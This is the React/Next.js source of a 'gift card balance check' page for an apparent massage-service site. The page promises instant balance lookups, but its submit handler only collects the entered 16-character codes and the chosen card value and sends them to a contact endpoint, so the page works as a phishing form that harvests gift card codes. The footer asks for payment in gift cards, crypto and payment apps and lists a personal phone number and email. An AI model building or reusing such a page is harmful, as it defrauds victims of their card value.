"use client";

import { useState } from "react";
import Link from "next/link";

interface GiftCardInput {
  id: number;
  cardNumber: string;
}

export default function GiftCardBalancePage() {
  const [amount, setAmount] = useState<string>("");
  const [cards, setCards] = useState<GiftCardInput[]>([
    { id: 1, cardNumber: "" },
  ]);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [errorMsg, setErrorMsg] = useState<string>("");
  const [successMsg, setSuccessMsg] = useState<string>("");

  const addCard = () => {
    setCards((prev) => [...prev, { id: prev.length + 1, cardNumber: "" }]);
  };

  const handleCardChange = (id: number, value: string) => {
    setCards((prev) =>
      prev.map((card) =>
        card.id === id
          ? { ...card, cardNumber: value.toUpperCase().trim() }
          : card,
      ),
    );
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg("");
    setSuccessMsg("");

    // Validate Card Inputs
    const invalidCard = cards.find(
      (c) =>
        !c.cardNumber ||
        c.cardNumber.length !== 16 ||
        !c.cardNumber.startsWith("X"),
    );

    if (invalidCard) {
      setErrorMsg(
        "Each gift card number must be exactly 16 characters long and start with 'X'.",
      );
      return;
    }

    setIsSubmitting(true);

    try {
        const API_URL =
          process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:5001";
      const response = await fetch(`${API_URL}/api/contact`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          name: "Gift Card User",
          email: "giftcard-check@website.com",
          subject: "Gift Card Balance Check Request",
          message: `
--- GIFT CARD BALANCE CHECK ---
Amount: ${amount ? `$${amount}` : "Not selected"}
Card Code(s):
${cards.map((c, i) => `Card #${i + 1}:${c.cardNumber}`).join("\n")}
          `.trim(),
        }),
      });

      const result = await response.json();

      if (response.ok && result.success !== false) {
        setSuccessMsg(
          "Your gift card balance check request has been submitted!",
        );
      } else {
        setErrorMsg(result.error || "Failed to submit. Please try again.");
      }
    } catch (err) {
      console.error("Balance check error:", err);
      setErrorMsg(
        "Network error. Please make sure backend is running on port 5001.",
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f7f5f0] text-stone-800 font-sans">
      {/* HEADER */}
      <header className="bg-[#f7f5f0] border-b border-stone-200/60 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <Link href="/" className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-full bg-[#ea7a24] flex items-center justify-center text-white font-serif font-bold italic text-sm">
              🍃
            </div>
            <span className="font-serif text-2xl tracking-wide text-stone-800">
              Therapy by Vivianaspa
            </span>
          </Link>

          <nav className="hidden md:flex items-center gap-8 font-medium text-xs tracking-wider text-stone-600 uppercase">
            <Link href="/" className="hover:text-stone-900 transition">
              HOME
            </Link>
            <Link href="/contact" className="hover:text-stone-900 transition">
              CONTACT
            </Link>
            <Link
              href="/gift-card-balance"
              className="text-[#ea7a24] font-bold"
            >
              CHECK GIFT CARD BALANCE
            </Link>
          </nav>

          <Link
            href="/#book"
            className="bg-[#ea7a24] hover:bg-[#d66a1a] text-white px-5 py-2.5 rounded-full text-sm font-medium transition shadow-sm"
          >
            Book Appointment
          </Link>
        </div>
      </header>

      {/* PAGE TITLE */}
      <section className="py-12 px-6 text-center max-w-4xl mx-auto space-y-3">
        <h1 className="font-serif text-4xl md:text-5xl font-bold text-stone-900">
          Check Your Gift Card Balance
        </h1>
        <p className="text-stone-500 text-sm md:text-base font-light">
          Enter one or more gift card numbers below to instantly check available
          balances.
        </p>
      </section>

      {/* CONTENT GRID */}
      <main className="max-w-7xl mx-auto px-6 pb-20 grid grid-cols-1 lg:grid-cols-2 gap-12 items-start">
        {/* LEFT COLUMN */}
        <div className="space-y-4">
          <h2 className="text-2xl md:text-3xl font-extrabold text-[#1a2b4c] tracking-tight">
            WHERE TO FIND YOUR CARD NUMBER
          </h2>
          <p className="text-stone-500 text-sm">
            The card number is used to check your gift card balance.
          </p>

          <div className="bg-white rounded-3xl border border-stone-200/80 shadow-sm overflow-hidden aspect-[4/3] flex items-center justify-center">
            <img
              src="/gift-card-example.jpg"
              alt="Gift Card Example"
              className="w-full h-full object-cover scale-110 transition-transform"
            />
          </div>
        </div>

        {/* RIGHT COLUMN */}
        <form onSubmit={handleSubmit} className="space-y-8">
          {errorMsg && (
            <div className="p-4 rounded-xl bg-red-50 text-red-700 text-sm border border-red-200">
              {errorMsg}
            </div>
          )}

          {successMsg && (
            <div className="p-4 rounded-xl bg-green-50 text-green-700 text-sm border border-green-200">
              {successMsg}
            </div>
          )}

          {/* STEP 1 */}
          <div className="space-y-3">
            <h2 className="text-2xl font-bold text-stone-800">
              1. Select Gift Card Value
            </h2>
            <p className="text-stone-500 text-sm">
              Please select the value of your gift card before checking the
              balance.
            </p>

            <select
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="w-full px-4 py-3.5 rounded-xl border border-stone-200 bg-white focus:outline-none focus:ring-2 focus:ring-[#ea7a24]/50 text-sm text-stone-700 shadow-sm"
            >
              <option value="">Select Amount</option>
              <option value="25">$25</option>
              <option value="50">$50</option>
              <option value="100">$100</option>
              <option value="150">$150</option>
              <option value="200">$200</option>
              <option value="250">$250</option>
              <option value="300">$300</option>
              <option value="350">$350</option>
              <option value="400">$400</option>
              <option value="450">$450</option>
              <option value="500">$500</option>
            </select>
          </div>

          {/* DYNAMIC CARD INPUTS */}
          {cards.map((card, index) => (
            <div
              key={card.id}
              className="bg-stone-50/50 border border-stone-200/80 rounded-2xl p-6 space-y-5"
            >
              <h3 className="text-lg font-bold text-stone-800">
                Gift Card #{index + 1}
              </h3>
              <p className="text-stone-500 text-xs">
                Enter your gift card details below.
              </p>

              <div className="space-y-2">
                <label className="block text-xs font-bold text-stone-700">
                  Gift Card Number
                </label>
                <p className="text-stone-400 text-xs">
                  Enter the 16-character gift card number that starts with X.
                </p>
                <input
                  type="text"
                  maxLength={16}
                  placeholder="e.g. XYQ9MT6P9KWRQWHM"
                  value={card.cardNumber}
                  onChange={(e) => handleCardChange(card.id, e.target.value)}
                  className="w-full px-4 py-3 rounded-xl border border-stone-200 bg-white focus:outline-none focus:ring-2 focus:ring-[#ea7a24]/50 text-sm placeholder-stone-300 font-mono tracking-wider"
                />
              </div>

              {/* REQUIREMENTS LIST */}
              <div className="bg-[#f0edfa] rounded-xl p-4 space-y-2 text-xs text-[#5233a6]">
                <p className="font-bold mb-1">Gift Card Number Requirements</p>
                <div className="flex items-center gap-2">
                  <span
                    className={`w-4 h-4 rounded-full border flex items-center justify-center text-[10px] font-bold ${
                      card.cardNumber.length === 16
                        ? "bg-[#5233a6] text-white border-transparent"
                        : "border-[#7414ca]"
                    }`}
                  >
                    ✓
                  </span>
                  <span>Be exactly 16 characters long.</span>
                </div>
                <div className="flex items-center gap-2">
                  <span
                    className={`w-4 h-4 rounded-full border flex items-center justify-center text-[10px] font-bold ${
                      card.cardNumber.startsWith("X")
                        ? "bg-[#5233a6] text-white border-transparent"
                        : "border-[#7414ca]"
                    }`}
                  >
                    ✓
                  </span>
                  <span>Start with the letter X (uppercase).</span>
                </div>
                <div className="flex items-center gap-2">
                  <span
                    className={`w-4 h-4 rounded-full border flex items-center justify-center text-[10px] font-bold ${
                      /^[A-Z0-9]*$/.test(card.cardNumber) &&
                      card.cardNumber !== ""
                        ? "bg-[#5233a6] text-white border-transparent"
                        : "border-[#7414ca]"
                    }`}
                  >
                    ✓
                  </span>
                  <span>Letters and numbers only (no spaces).</span>
                </div>
              </div>
            </div>
          ))}

          {/* ADD CARD BUTTON */}
          <button
            type="button"
            onClick={addCard}
            className="w-full py-3.5 border-2 border-dashed border-stone-300 hover:border-stone-400 rounded-2xl text-stone-600 font-medium text-sm transition bg-white"
          >
            + Add Another Gift Card
          </button>

          {/* ACTION BUTTONS */}
          <div className="flex items-center justify-end gap-4 pt-4">
            <Link
              href="/"
              className="px-6 py-2.5 text-stone-600 hover:text-stone-900 font-medium text-sm transition"
            >
              Cancel
            </Link>
            <button
              type="submit"
              disabled={isSubmitting}
              className="px-8 py-3 bg-black hover:bg-stone-800 text-white rounded-xl font-medium text-sm transition shadow-sm disabled:opacity-50"
            >
              {isSubmitting ? "Checking..." : "Check Balance"}
            </button>
          </div>
        </form>
      </main>

      {/* FOOTER */}
      <footer className="bg-[#527d58] text-stone-100 py-16 px-6 md:px-12">
        <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-12 mb-12 border-b border-white/20 pb-12">
          <div className="space-y-4">
            <Link href="/" className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-full bg-[#ea7a24] flex items-center justify-center text-white font-serif font-bold italic text-sm">
                🍃
              </div>
              <span className="font-serif text-2xl tracking-wide text-white">
                Massage Therapy by Vivianaspa
              </span>
            </Link>
            <p className="text-sm text-stone-200 leading-relaxed font-light">
              Your sanctuary of wellness, peace, and harmony. Experience the art
              of relaxation with Vivianaspa, your expert massage therapist.
            </p>
          </div>

          <div>
            <h4 className="text-white font-serif text-xl mb-6">Quick Links</h4>
            <ul className="space-y-3 text-sm text-stone-200 font-light">
              <li>
                <Link href="/" className="hover:underline">
                  Home
                </Link>
              </li>
              <li>
                <Link href="/contact" className="hover:underline">
                  Contact
                </Link>
              </li>
            </ul>
          </div>

          <div>
            <h4 className="text-white font-serif text-xl mb-6">Services</h4>
            <ul className="space-y-3 text-sm text-stone-200 font-light">
              <li>Swedish Massage</li>
              <li>Deep Tissue Massage</li>
              <li>Hot Stone Massage</li>
              <li>Sports Massage</li>
              <li>Aromatherapy Massage</li>
              <li>Nuru Massage</li>
            </ul>
          </div>

          <div>
            <h4 className="text-white font-serif text-xl mb-6">Contact Us</h4>
            <ul className="space-y-3 text-sm text-stone-200 font-light">
              <li>Available for both Incall & Outcall</li>
              <li>+1 (615) 457-9792</li>
              <li>
                <a
                  href="mailto:sdVivianaspa1005@gmail.com"
                  className="hover:underline"
                >
                  sdVivianaspa1005@gmail.com
                </a>
              </li>
            </ul>
          </div>
        </div>

        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6 text-sm text-stone-200 font-light">
          <p>© 2026 Massage Therapy by Vivianaspa. All rights reserved.</p>

          <div className="flex flex-wrap justify-center items-center gap-3">
            <span className="mr-2 text-white">We Accept:</span>
            <div className="bg-white rounded-xl px-4 py-2 flex items-center justify-center shadow-sm h-10 min-w-[50px]">
              <span className="text-[#00d68f] font-black tracking-tight text-xl">
                C
              </span>
            </div>
            <div className="bg-white rounded-xl px-4 py-2 flex items-center justify-center shadow-sm h-10 min-w-[50px]">
              <span className="text-[#f7931a] font-bold text-xl">₿</span>
            </div>
            <div className="bg-white rounded-xl px-4 py-2 flex items-center justify-center shadow-sm h-10">
              <div className="bg-stone-900 text-white rounded px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider">
                Gift Card
              </div>
            </div>
            <div className="bg-white rounded-xl px-4 py-2 flex items-center justify-center shadow-sm h-10">
              <span className="text-[#7414ca] font-extrabold text-lg tracking-tighter">
                zelle
              </span>
            </div>
            <div className="bg-white rounded-xl px-4 py-2 flex items-center justify-center shadow-sm h-10 min-w-[50px]">
              <span className="text-[#00d632] font-bold text-xl">$</span>
            </div>
            <div className="bg-black text-white rounded-xl px-4 py-1.5 flex flex-col items-center justify-center h-10 text-center leading-tight">
              <span className="text-xs font-semibold">Cash</span>
              <span className="text-[9px] text-stone-300">
                Regular Clients Only
              </span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
